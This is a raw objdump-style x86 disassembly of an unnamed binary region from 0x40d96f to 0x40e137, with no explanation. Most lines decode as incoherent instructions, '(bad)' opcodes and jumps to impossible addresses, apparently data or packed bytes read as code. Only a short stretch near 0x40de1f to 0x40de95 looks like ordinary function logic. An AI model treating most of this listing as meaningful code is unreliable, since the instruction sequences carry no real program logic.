  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d945
  40d976:	repnz adc ebx,DWORD PTR [edi]
  40d979:	push   0x56219d2e
  40d97e:	cmp    edi,DWORD PTR [edi-0x61d81d24]
  40d984:	mov    dl,0x6b
  40d986:	int    0x6e
  40d988:	mov    ah,0xd5
  40d98a:	iret   
  40d98b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d98c:	mov    esp,0x752fd5d4
  40d991:	fdiv   st(5),st
  40d993:	call   0xffbf6bd
  40d998:	fimul  DWORD PTR [ecx]
  40d99a:	push   0xfffffff5
  40d99c:	adc    BYTE PTR [ebp-0x24322878],ch
  40d9a2:	jle    0x40d924
  40d9a4:	and    esi,DWORD PTR [eax-0x648c17b9]
  40d9aa:	dec    eax
  40d9ab:	daa    
  40d9ac:	fisub  DWORD PTR [ebx+0x66]
  40d9af:	mov    edx,DWORD PTR [ecx-0x6]
  40d9b2:	jmp    0x40d9bb
  40d9b4:	fimul  DWORD PTR [eax+0x4b]
  40d9b7:	fcomi  st,st(5)
  40d9b9:	stos   BYTE PTR es:[edi],al
  40d9ba:	addr16 pop ds
  40d9bc:	jle    0x40da26
  40d9be:	dec    ecx
  40d9bf:	jge    0x40d95f
  40d9c1:	or     BYTE PTR [ecx+edi*1-0x31],0x5a
  40d9c6:	xchg   edx,eax
  40d9c7:	mov    al,0x46
  40d9c9:	inc    ebp
  40d9ca:	fadd   DWORD PTR [edi-0x23]
  40d9cd:	mov    al,ds:0xb3c7ce66
  40d9d2:	xchg   esp,eax
  40d9d3:	push   cs
  40d9d4:	mov    ds:0x639480c4,eax
  40d9d9:	les    esi,FWORD PTR [edi]
  40d9db:	inc    ecx
  40d9dc:	jg     0x40da21
  40d9de:	xchg   esp,eax
  40d9df:	xchg   edx,eax
  40d9e0:	jg     0x40d99f
  40d9e2:	jbe    0x40da52
  40d9e4:	mov    bh,0xb8
  40d9e6:	sar    DWORD PTR [eax+edx*2+0x11c10c64],0x23
  40d9ee:	dec    esp
  40d9ef:	sub    eax,0x330227b2
  40d9f4:	inc    esi
  40d9f5:	jge    0x40d9ab
  40d9f7:	stos   BYTE PTR es:[edi],al
  40d9f8:	mov    ah,0xe9
  40d9fa:	inc    edx
  40d9fb:	cli    
  40d9fc:	and    al,0x93
  40d9fe:	inc    ebp
  40d9ff:	(bad)  
  40da00:	mov    esp,0x7199248f
  40da05:	lds    edi,FWORD PTR [edx+0x61]
  40da08:	into   
  40da09:	(bad)  
  40da0a:	jmp    FWORD PTR [edi]
  40da0c:	addr16 xor eax,0xcd326b29
  40da12:	jbe    0x40d9e4
  40da14:	sbb    edi,DWORD PTR [edx]
  40da16:	call   0x5776:0x8b7852a6
  40da1d:	mov    edx,0x8ec6d63a
  40da22:	aaa    
  40da23:	or     dx,WORD PTR [ecx-0x17d797a1]
  40da2a:	mov    bh,0xfe
  40da2c:	push   ecx
  40da2d:	into   
  40da2e:	sbb    eax,0x608c8064
  40da33:	cld    
  40da34:	(bad)  
  40da35:	sbb    al,0xa0
  40da38:	or     eax,0xfa2953c4
  40da3d:	je     0x40da99
  40da3f:	mov    DWORD PTR [ecx-0x73d77ee7],esp
  40da45:	mov    ebx,0xd26ded60
  40da4a:	sti    
  40da4b:	sti    
  40da4c:	mov    ebx,0xfe4a1f19
  40da51:	cmp    al,0x8d
  40da53:	pop    esi
  40da54:	mov    gs,WORD PTR [edi+esi*8+0x51]
  40da58:	xor    BYTE PTR [eax+0x693881c5],cl
  40da5e:	loop   0x40da39
  40da60:	xchg   esi,eax
  40da61:	(bad)  
  40da62:	xor    al,0x72
  40da64:	or     al,0x69
  40da66:	and    eax,0xd9c7db0c
  40da6b:	call   0xf75b:0x118f1552
  40da72:	inc    ecx
  40da73:	and    al,0xec
  40da75:	or     eax,0xba782279
  40da7a:	fs (bad) 
  40da7c:	mov    dh,0xce
  40da7e:	jns    0x40daa6
  40da80:	adc    dl,0x67
  40da83:	call   0xd0c6fb3
  40da88:	and    ah,BYTE PTR [ebx]
  40da8a:	mov    eax,ds:0xe8464c13
  40da8f:	add    DWORD PTR [esi+0x27],edx
  40da92:	xor    edx,edi
  40da94:	add    BYTE PTR [edi-0x5f],bh
  40da97:	push   edx
  40da98:	stc    
  40da99:	pusha  
  40da9a:	ins    DWORD PTR es:[edi],dx
  40da9b:	add    ebx,ebp
  40da9d:	sbb    DWORD PTR [esi],edx
  40da9f:	jg     0x40dadb
  40daa1:	leave  
  40daa2:	je     0x40db01
  40daa4:	test   eax,0x8a99fb48
  40daa9:	add    BYTE PTR [ebp+0x23],0x7c
  40daad:	push   ds
  40daae:	push   cs
  40daaf:	stos   DWORD PTR es:[edi],eax
  40dab0:	mov    ebp,0x641370a
  40dab5:	xchg   esp,eax
  40dab6:	aas    
  40dab7:	xchg   edx,eax
  40dab8:	sbb    bh,BYTE PTR [eax-0x75f39388]
  40dabe:	outs   dx,BYTE PTR ds:[esi]
  40dabf:	imul   BYTE PTR [eax+0x4]
  40dac2:	mov    esp,0x5f47961a
  40dac7:	inc    ebx
  40dac8:	add    BYTE PTR [eax-0x30],al
  40dacb:	clc    
  40dacc:	jle    0x40db19
  40dace:	push   edi
  40dacf:	push   esp
  40dad0:	ret    0x3c0d
  40dad3:	sbb    dl,BYTE PTR [esi-0x347696bd]
  40dad9:	(bad)  
  40dada:	(bad)  [edi-0x6ddc4ca8]
  40dae0:	add    al,0xe5
  40dae2:	push   ss
  40dae3:	ins    BYTE PTR es:[edi],dx
  40dae4:	push   edi
  40dae5:	sub    ebx,edx
  40dae7:	mov    DWORD PTR [ebp-0xbc246c7],0x328b74e
  40daf1:	mov    edi,0x46e20d5c
  40daf6:	cdq    
  40daf7:	pop    edx
  40daf8:	arpl   WORD PTR [eax+0x4e],bx
  40dafb:	aaa    
  40dafc:	jmp    FWORD PTR [eax+0x27]
  40daff:	cmp    al,0xfe
  40db01:	lock mov ebp,0xc233b78d
  40db07:	repz xchg edi,eax
  40db09:	push   esi
  40db0a:	lods   al,BYTE PTR ds:[esi]
  40db0b:	imul   BYTE PTR [ecx-0x3b]
  40db0e:	mov    esi,0xda97a344
  40db13:	pop    edi
  40db14:	mov    ds:0x7218968f,al
  40db19:	fild   QWORD PTR ds:0x79f6fe88
  40db1f:	int    0x5e
  40db21:	lods   eax,DWORD PTR ds:[esi]
  40db22:	stos   BYTE PTR es:[edi],al
  40db23:	mov    al,ds:0x757e1e16
  40db28:	inc    ecx
  40db29:	jnp    0x40db72
  40db2b:	scas   al,BYTE PTR es:[edi]
  40db2c:	lods   al,BYTE PTR ds:[esi]
  40db2d:	rol    BYTE PTR [ebx+esi*1-0x24cb059d],cl
  40db34:	inc    ecx
  40db35:	adc    eax,0xd79f4336
  40db3a:	or     BYTE PTR [ecx-0x4c],0x10
  40db3e:	inc    ecx
  40db3f:	inc    esp
  40db40:	and    BYTE PTR [eax],bl
  40db42:	in     eax,dx
  40db43:	push   edi
  40db44:	jne    0x40dadf
  40db46:	(bad)  [ebp*2-0xcaf5c7d]
  40db4d:	push   ecx
  40db4e:	ss dec esi
  40db50:	jge    0x40db03
  40db52:	sub    esi,edi
  40db54:	scas   eax,DWORD PTR es:[edi]
  40db55:	push   ds
  40db56:	outs   dx,DWORD PTR ds:[esi]
  40db57:	test   edi,ecx
  40db59:	das    
  40db5a:	push   eax
  40db5b:	add    dl,BYTE PTR [edi]
  40db5d:	(bad)  
  40db5e:	cld    
  40db5f:	and    eax,0x3484fe7b
  40db64:	gs and al,0x4c
  40db67:	jo     0x40db54
  40db69:	adc    DWORD PTR [ecx-0x3e],ecx
  40db6c:	jmp    0xfdd27f8a
  40db71:	mov    esi,0x1bdba593
  40db76:	scas   eax,DWORD PTR es:[edi]
  40db77:	ins    BYTE PTR es:[edi],dx
  40db78:	sub    eax,0x75e92ded
  40db7d:	jno    0x40db88
  40db7f:	inc    eax
  40db80:	sbb    al,0x81
  40db82:	jmp    0x1e61:0x1a62ba71
  40db89:	int    0xf6
  40db8b:	adc    al,0x2c
  40db8d:	pop    ebx
  40db8e:	sahf   
  40db8f:	ret    
  40db90:	push   eax
  40db91:	mov    al,ds:0x7178b0bd
  40db96:	mov    esp,0x98767e6b
  40db9b:	clc    
  40db9c:	lea    edi,[ebx+0x3]
  40db9f:	shr    DWORD PTR [eax],0x10
  40dba2:	outs   dx,BYTE PTR ds:[esi]
  40dba3:	lock outs dx,DWORD PTR ds:[esi]
  40dba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dba6:	sub    al,0xb8
  40dba8:	lock fcomp DWORD PTR [edx]
  40dbab:	das    
  40dbac:	pop    eax
  40dbad:	push   es
  40dbae:	test   BYTE PTR [esi+eax*1],cl
  40dbb1:	cmp    eax,0x3b771629
  40dbb6:	ror    DWORD PTR [edi],0x85
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x20bfeba4],0xfa606e77
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40db61
  40dbe0:	ja     0x40db71
  40dbe2:	aas    
  40dbe3:	adc    ah,al
  40dbe5:	leave  
  40dbe6:	clc    
  40dbe7:	daa    
  40dbe8:	adc    BYTE PTR [eax-0x45],cl
  40dbeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbec:	loopne 0x40dc5f
  40dbee:	cld    
  40dbef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf0:	fs sbb al,0xfc
  40dbf3:	mov    ebp,0x6f40cec2
  40dbf8:	mov    cl,0x68
  40dbfa:	mov    ecx,0xda319ba4
  40dbff:	dec    ecx
  40dc00:	fisubr WORD PTR [edi+0x1c]
  40dc03:	or     DWORD PTR [esi+0x3c],esi
  40dc06:	mov    esi,DWORD PTR [ebx+0x75]
  40dc09:	jecxz  0x40dba0
  40dc0b:	lods   eax,DWORD PTR ds:[esi]
  40dc0c:	sahf   
  40dc0d:	loop   0x40dba4
  40dc0f:	or     BYTE PTR [ecx+0x2c1bf238],0x88
  40dc16:	popa   
  40dc17:	mov    ss:0xf9871137,al
  40dc1d:	ds sbb bl,0x66
  40dc21:	sub    eax,0x6c20ad
  40dc26:	mov    esi,0x2ed4221f
  40dc2b:	mov    ch,0x75
  40dc2d:	das    
  40dc2e:	test   BYTE PTR [edi],ch
  40dc30:	add    ebx,edi
  40dc32:	adc    bl,BYTE PTR ds:0x7a18692f
  40dc38:	sub    BYTE PTR [edi+ebp*1+0x3f51c7c3],dh
  40dc3f:	xchg   edx,eax
  40dc40:	mov    eax,ds:0xb68e5a91
  40dc45:	dec    esp
  40dc46:	mov    edi,0x57aa562e
  40dc4b:	mov    edx,0xf663a9e5
  40dc50:	or     bh,cl
  40dc52:	arpl   ax,cx
  40dc54:	out    0x7b,al
  40dc56:	cmp    edx,DWORD PTR [ecx]
  40dc58:	sub    DWORD PTR [edx+0x5d493c4f],ecx
  40dc5e:	into   
  40dc5f:	(bad)  
  40dc60:	in     al,dx
  40dc61:	push   ebp
  40dc62:	imul   edx,DWORD PTR [ebp+0x48],0xffffffe4
  40dc66:	test   DWORD PTR [ebp+0x6910048a],ebp
  40dc6c:	inc    ebp
  40dc6d:	pop    esp
  40dc6e:	rol    ebp,0x5
  40dc71:	fnstcw WORD PTR [ebx]
  40dc73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc74:	add    BYTE PTR [esp+esi*2],cl
  40dc77:	push   0x745325da
  40dc7c:	pop    esi
  40dc7d:	ds cmp eax,0xf91629e4
  40dc83:	xor    al,0x21
  40dc85:	cs push ss
  40dc87:	sbb    esp,DWORD PTR [edi-0x50]
  40dc8a:	jle    0x40dc33
  40dc8c:	into   
  40dc8d:	pop    esi
  40dc8e:	call   0x47f7:0xe17c2601
  40dc95:	popa   
  40dc96:	lea    ebx,[edx+0x321a0133]
  40dc9c:	mov    esi,0x1b680edf
  40dca1:	jne    0x40dcbd
  40dca3:	cmp    BYTE PTR [eax],dl
  40dca5:	jp     0x40dcce
  40dca7:	mov    al,ds:0x68c503e6
  40dcac:	xchg   DWORD PTR [ebp+0x6b7ce35],ecx
  40dcb2:	adc    cl,dl
  40dcb4:	not    DWORD PTR [eax-0x287a657d]
  40dcba:	sahf   
  40dcbb:	fs cmc 
  40dcbd:	sbb    eax,0xc55138aa
  40dcc2:	shl    DWORD PTR [edi+0x7c],cl
  40dcc5:	(bad)  
  40dcc6:	fsubr  DWORD PTR [eax+eax*4-0x702b4272]
  40dccd:	dec    edi
  40dcce:	(bad)  
  40dcd0:	enter  0x4f81,0x9f
  40dcd4:	mov    WORD PTR [edx-0x4cdd7873],ss
  40dcda:	sub    eax,eax
  40dcdc:	pop    es
  40dcdd:	(bad)  
  40dcde:	jmp    0xe86d:0x84288d16
  40dce5:	mov    dl,0xdd
  40dce7:	add    esi,DWORD PTR [edx+0x204b264c]
  40dced:	push   0xa169b4a2
  40dcf2:	call   0xdf93:0x9f1d7653
  40dcf9:	iret   
  40dcfa:	push   ss
  40dcfb:	mov    esp,DWORD PTR [eax]
  40dcfd:	sbb    ebx,ecx
  40dcff:	std    
  40dd00:	xor    eax,0x7c976603
  40dd05:	mov    ch,0x35
  40dd07:	mov    BYTE PTR [esi+0x20c6acd9],dh
  40dd0d:	add    BYTE PTR [ebx-0x11],0xa
  40dd11:	sub    bh,0x43
  40dd14:	mov    WORD PTR [esi],ds
  40dd16:	pop    ss
  40dd17:	push   edi
  40dd18:	stos   BYTE PTR es:[edi],al
  40dd19:	lods   eax,DWORD PTR ds:[esi]
  40dd1a:	popa   
  40dd1b:	and    ecx,0xaa5ab528
  40dd21:	cmp    eax,DWORD PTR [ecx+0x41f2d1d1]
  40dd27:	add    edi,0xffffffec
  40dd2a:	pop    ds
  40dd2b:	sbb    al,0x77
  40dd2d:	pop    eax
  40dd2e:	dec    edx
  40dd2f:	mov    bl,0x75
  40dd31:	or     al,0xe8
  40dd33:	jbe    0x40dd84
  40dd35:	jp     0x40dd9c
  40dd37:	dec    esi
  40dd38:	pop    eax
  40dd39:	inc    ebx
  40dd3a:	sbb    al,0x71
  40dd3c:	rcr    BYTE PTR [ebx],1
  40dd3e:	sbb    bh,BYTE PTR [esi+0x3c]
  40dd41:	add    eax,0xc6a2c0c9
  40dd46:	sbb    al,0x5d
  40dd48:	mov    ds:0x26e8c4d7,al
  40dd4d:	call   0x9dd1d689
  40dd52:	pusha  
  40dd53:	sbb    BYTE PTR [edx],bh
  40dd55:	and    esp,edx
  40dd57:	outs   dx,DWORD PTR ds:[esi]
  40dd58:	inc    edi
  40dd59:	fwait
  40dd5a:	dec    esp
  40dd5b:	inc    edi
  40dd5c:	pop    edi
  40dd5d:	push   ebp
  40dd5e:	cli    
  40dd5f:	in     eax,dx
  40dd60:	push   ebp
  40dd61:	(bad)  
  40dd63:	mov    edx,0x60c0099a
  40dd68:	mov    ah,0xc6
  40dd6a:	or     edi,edi
  40dd6c:	sub    eax,0xe7fc4cd6
  40dd71:	fisub  WORD PTR [ebx+ebx*1-0x52]
  40dd75:	cmp    eax,0x4ba88084
  40dd7a:	aam    0xb9
  40dd7c:	cs clc 
  40dd7e:	imul   eax,ebp,0x39
  40dd81:	clc    
  40dd82:	cmp    BYTE PTR [ecx-0x69d84650],dh
  40dd88:	mov    cl,BYTE PTR [eax+edx*2+0xb]
  40dd8c:	adc    ebx,esi
  40dd8e:	jo     0x40dd5b
  40dd90:	fidiv  DWORD PTR [ecx]
  40dd92:	out    0x6d,eax
  40dd94:	(bad)
  40dd97:	leave  
  40dd98:	fldcw  WORD PTR [edx-0x23]
  40dd9b:	in     eax,dx
  40dd9c:	inc    esp
  40dd9d:	or     ebx,DWORD PTR [ebp-0x1a]
  40dda0:	adc    eax,0xc6c60cca
  40dda5:	les    ecx,FWORD PTR [edx+0x468aefa9]
  40ddab:	lock icebp 
  40ddad:	mov    ah,0xac
  40ddaf:	mov    WORD PTR [edi],cs
  40ddb1:	push   ss
  40ddb2:	jnp    0x40dd35
  40ddb4:	ins    BYTE PTR es:[edi],dx
  40ddb5:	add    DWORD PTR [ebp+0x14],ebp
  40ddb8:	div    DWORD PTR [edx+ecx*8+0x12]
  40ddbc:	je     0x40de37
  40ddbe:	adc    BYTE PTR [ebx],ch
  40ddc0:	adc    DWORD PTR [ecx-0x70],eax
  40ddc3:	pop    ss
  40ddc4:	inc    ebp
  40ddc5:	xchg   esi,eax
  40ddc6:	fnstsw WORD PTR ss:[ebp+0x2cfe2428]
  40ddcd:	xor    DWORD PTR [eax],edx
  40ddcf:	mov    cs,esp
  40ddd1:	mov    dh,0xaf
  40ddd3:	(bad)  
  40ddd4:	div    bh
  40ddd6:	sbb    BYTE PTR [eax-0xe],dh
  40ddd9:	jno    0x40dd78
  40dddb:	pop    es
  40dddc:	and    ebx,ebp
  40ddde:	sbb    eax,DWORD PTR [eax-0x581406ec]
  40dde4:	pop    es
  40dde5:	dec    eax
  40dde6:	imul   edx,eax,0xafb6a74c
  40ddec:	mov    dl,0x9a
  40ddee:	arpl   WORD PTR [edi],ax
  40ddf0:	daa    
  40ddf1:	pop    ecx
  40ddf2:	icebp  
  40ddf3:	jno    0x40de71
  40ddf5:	inc    eax
  40ddf6:	cmp    BYTE PTR [edi-0x21534dcc],ah
  40ddfc:	push   cs
  40ddfd:	push   eax
  40ddfe:	inc    edi
  40ddff:	bound  ebx,QWORD PTR [edi+0x4]
  40de02:	mov    al,0xa4
  40de04:	cmc    
  40de05:	sar    DWORD PTR [ecx+0x61f1f8df],1
  40de0b:	or     al,BYTE PTR [ebx-0x3940668f]
  40de11:	push   eax
  40de12:	jo     0x40de62
  40de14:	or     cl,BYTE PTR es:[eax+0x1b]
  40de18:	mov    bl,0x67
  40de1a:	addr16 cld 
  40de1c:	dec    edx
  40de1d:	mov    ah,0x39
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	neg    DWORD PTR [esi+0x4f]
  40dea8:	mov    ecx,DWORD PTR [edx-0x46]
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40de5c
  40deb3:	cli    
  40deb4:	sbb    DWORD PTR [esi],ebp
  40deb6:	add    edx,DWORD PTR [esi+0x548273af]
  40debc:	cmp    DWORD PTR [edi+edx*8-0x68],0xd84e8645
  40dec4:	dec    edi
  40dec5:	mov    al,ds:0xa77c5621
  40deca:	je     0x40df27
  40decc:	sub    dh,cl
  40dece:	and    al,0xad
  40ded0:	adc    DWORD PTR [edi],ecx
  40ded2:	dec    esp
  40ded3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded4:	xchg   BYTE PTR [edi+0x5d],ah
  40ded7:	jnp    0x40dea5
  40ded9:	mov    dl,0xd8
  40dedb:	add    esi,DWORD PTR es:[edi+0x21811c47]
  40dee2:	jnp    0x40df29
  40dee4:	xchg   edx,ebx
  40dee6:	pop    ds
  40dee7:	jmp    0xeb0f1dec
  40deec:	mov    BYTE PTR [eax],al
  40deee:	mov    dh,0x3
  40def0:	stos   BYTE PTR es:[edi],al
  40def1:	xlat   BYTE PTR ds:[ebx]
  40def2:	inc    eax
  40def3:	pop    edx
  40def4:	in     eax,dx
  40def5:	jecxz  0x40df38
  40def7:	(bad)  
  40def8:	push   esp
  40def9:	inc    ebx
  40defa:	sbb    eax,0x60b7fbd2
  40deff:	inc    edx
  40df00:	retf   
  40df01:	cwde   
  40df02:	add    eax,DWORD PTR [ecx]
  40df04:	jl     0x40df7e
  40df06:	xor    BYTE PTR [ebx-0x7ec0b8f7],cl
  40df0c:	push   ecx
  40df0d:	pop    ebp
  40df0e:	retf   
  40df0f:	stos   DWORD PTR es:[edi],eax
  40df10:	stos   BYTE PTR es:[edi],al
  40df11:	test   DWORD PTR [edi+0x5e],edx
  40df14:	stos   DWORD PTR es:[edi],eax
  40df15:	dec    edi
  40df16:	repz mov edi,0x11435813
  40df1c:	add    eax,DWORD PTR [edx-0x2af77757]
  40df22:	dec    esi
  40df23:	in     al,0x59
  40df25:	xor    edx,ecx
  40df27:	push   ebp
  40df28:	outs   dx,DWORD PTR ds:[esi]
  40df29:	add    eax,0x2bfce1bd
  40df2e:	sahf   
  40df2f:	add    al,0xf1
  40df31:	xchg   edx,eax
  40df32:	mov    DWORD PTR [eax+0x1e],edx
  40df35:	cdq    
  40df36:	stos   BYTE PTR es:[edi],al
  40df37:	or     BYTE PTR [ebp+0x3f],dl
  40df3a:	dec    esp
  40df3b:	jbe    0x40debf
  40df3d:	cmp    dh,dh
  40df3f:	jmp    0x40df1a
  40df41:	test   BYTE PTR [ebx-0x18],ch
  40df44:	sbb    DWORD PTR [ecx+eiz*1-0x3c366abb],edi
  40df4b:	pop    eax
  40df4c:	jmp    0xeca3:0xa8e6b28e
  40df53:	inc    ebp
  40df54:	hlt    
  40df55:	dec    ecx
  40df56:	fstp   DWORD PTR [bx+si]
  40df59:	fcmovbe st,st(5)
  40df5b:	std    
  40df5c:	mov    al,0x9b
  40df5e:	stc    
  40df5f:	std    
  40df60:	and    al,0x63
  40df62:	aam    0xc6
  40df64:	push   cs
  40df65:	fistp  DWORD PTR [ebp+0x59]
  40df68:	lock out dx,eax
  40df6a:	or     al,0x1c
  40df6c:	jo     0x40dfd5
  40df6e:	rcr    BYTE PTR [ecx],cl
  40df70:	xor    edi,DWORD PTR [esi]
  40df72:	out    0x94,eax
  40df74:	push   edx
  40df75:	lea    ecx,[edi+ecx*2+0x4d]
  40df79:	ret    
  40df7a:	push   es
  40df7b:	icebp  
  40df7c:	jns    0x40dfac
  40df7e:	repnz stc 
  40df80:	dec    ebp
  40df81:	test   BYTE PTR [ebx-0x14f2346b],dh
  40df87:	mov    ebp,0x1e88a091
  40df8c:	mov    al,ds:0xf132a71d
  40df91:	push   ss
  40df92:	nop
  40df93:	call   0x4113:0x3aed90c4
  40df9a:	adc    al,0x87
  40df9c:	xor    bl,BYTE PTR [esi-0x5cde615]
  40dfa2:	leave  
  40dfa3:	add    edi,DWORD PTR [edi+ecx*8+0x19]
  40dfa7:	fwait
  40dfa8:	mov    ecx,0x57055d0c
  40dfad:	lock pop edx
  40dfaf:	jae    0x40dfc5
  40dfb1:	iret   
  40dfb2:	mov    ds:0xf4c38c74,eax
  40dfb7:	or     al,0x86
  40dfb9:	les    eax,FWORD PTR [ecx]
  40dfbb:	in     eax,0x0
  40dfbd:	sbb    DWORD PTR [eax+0xf],ebx
  40dfc0:	add    BYTE PTR [edx-0x45],cl
  40dfc3:	mov    ebp,0x638b17e6
  40dfc8:	mov    edx,0xac6ace0f
  40dfcd:	and    BYTE PTR [ebx+0x2d810845],cl
  40dfd3:	pop    ss
  40dfd4:	cmp    BYTE PTR [ebx+0x0],al
  40dfd7:	and    eax,0x53000006
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	mov    edi,?
  40e005:	jb     0x40e07d
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e027
  40e010:	mov    esi,0xc92c322e
  40e015:	mov    cl,0x50
  40e017:	iret   
  40e018:	(bad)  
  40e01a:	xchg   edx,eax
  40e01b:	ret    0x7e95
  40e01e:	adc    eax,0x21917e73
  40e023:	hlt    
  40e024:	xchg   esi,eax
  40e025:	sbb    DWORD PTR [edi+ebx*4+0x7e],ebx
  40e029:	mov    eax,ds:0x2c6e0851
  40e02e:	cmc    
  40e02f:	fsub   DWORD PTR [ecx]
  40e031:	(bad)  
  40e032:	sar    DWORD PTR [edi+0x2a],1
  40e035:	xchg   ebx,eax
  40e036:	or     eax,0xa943c001
  40e03b:	or     al,0xe2
  40e03d:	pop    ebp
  40e03e:	add    BYTE PTR [ecx],cl
  40e040:	loopne 0x40dfe9
  40e042:	iret   
  40e043:	pop    ebx
  40e044:	pop    esp
  40e045:	xchg   edi,eax
  40e046:	dec    esi
  40e047:	inc    esi
  40e048:	jmp    0x9655a812
  40e04d:	adc    dl,BYTE PTR [ebx+edx*8-0x53]
  40e051:	and    eax,0x3f579cb5
  40e056:	aad    0x5b
  40e058:	gs mov ch,0x2d
  40e05b:	test   eax,0x1402fe42
  40e060:	stos   BYTE PTR es:[edi],al
  40e061:	inc    edx
  40e062:	retf   
  40e063:	mov    ss,WORD PTR [ecx]
  40e065:	pop    ss
  40e066:	mov    ds:0xc76dddad,al
  40e06b:	jp     0x40e072
  40e06d:	and    bh,BYTE PTR [ebp-0x4e]
  40e070:	inc    ebx
  40e071:	push   0x9aec60a7
  40e076:	and    DWORD PTR [ecx+eax*2+0x7543cbaf],edi
  40e07d:	adc    eax,ebp
  40e07f:	test   eax,0x57814f3e
  40e084:	cli    
  40e085:	lea    ecx,[eax]
  40e087:	adc    al,0x4e
  40e089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08a:	jl     0x40e03f
  40e08c:	and    dh,0x16
  40e08f:	mov    cl,0xe
  40e091:	xor    eax,0xcd6f90d1
  40e096:	iret   
  40e097:	pop    ecx
  40e098:	mov    ch,0xc9
  40e09a:	rol    BYTE PTR [ebp+0x1e],cl
  40e09d:	loopne 0x40e0cb
  40e09f:	xor    al,0x4c
  40e0a1:	out    dx,al
  40e0a2:	push   0x25
  40e0a4:	xor    eax,eax
  40e0a6:	push   0xffffffd7
  40e0a8:	fnstcw WORD PTR [edx+esi*2]
  40e0ab:	push   ss
  40e0ac:	in     al,dx
  40e0ad:	jg     0x40e092
  40e0af:	fdivr  DWORD PTR [ebp-0x31]
  40e0b2:	jg     0x40e10b
  40e0b4:	xor    edi,esi
  40e0b6:	rcr    eax,0xd5
  40e0b9:	jmp    0x40e0db
  40e0bb:	inc    edx
  40e0bc:	fistp  QWORD PTR [eax]
  40e0be:	cmp    eax,0x930d7bae
  40e0c3:	popf   
  40e0c4:	jge    0x40e0b5
  40e0c6:	dec    esp
  40e0c7:	repz fst st(6)
  40e0ca:	ret    
  40e0cb:	inc    esp
  40e0cc:	rol    DWORD PTR [edx-0x6427de63],0x33
  40e0d3:	cmp    al,0x5
  40e0d5:	push   ss
  40e0d6:	lods   eax,DWORD PTR ds:[esi]
  40e0d7:	lock outs dx,BYTE PTR ds:[esi]
  40e0d9:	dec    edx
  40e0da:	or     al,al
  40e0dc:	retf   0xfd6d
  40e0df:	pop    edi
  40e0e0:	add    BYTE PTR [ebx],dh
  40e0e2:	test   eax,0xedbd80f5
  40e0e7:	sbb    bh,dl
  40e0e9:	add    DWORD PTR [edi-0x1c],ebp
  40e0ec:	mov    cl,0xb0
  40e0ee:	inc    ebp
  40e0ef:	mov    bh,0xdc
  40e0f1:	pop    edx
  40e0f2:	xor    eax,0x4c910e2
  40e0f7:	fld    QWORD PTR [eax]
  40e0f9:	jno    0x40e116
  40e0fb:	cmp    al,0x3c
  40e0fd:	mov    esi,0xa3f8d92f
  40e102:	xchg   ecx,eax
  40e103:	arpl   WORD PTR [edx+0x4228375f],cx
  40e109:	jge    0x40e104
  40e10b:	not    DWORD PTR [ebp+0x73]
  40e10e:	or     esi,esp
  40e110:	mov    bl,0xb9
  40e112:	loope  0x40e141
  40e114:	sub    al,0xab
  40e116:	jmp    0xc1cf3b99
  40e11b:	fadd   QWORD PTR [ebp-0x2df2a94d]
  40e121:	int    0x95
  40e123:	mov    al,ds:0x534952e9
  40e128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e129:	out    dx,eax
  40e12a:	pop    ebp
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x433823,0x2097
  40e137:	mov    ebx,0x32729b
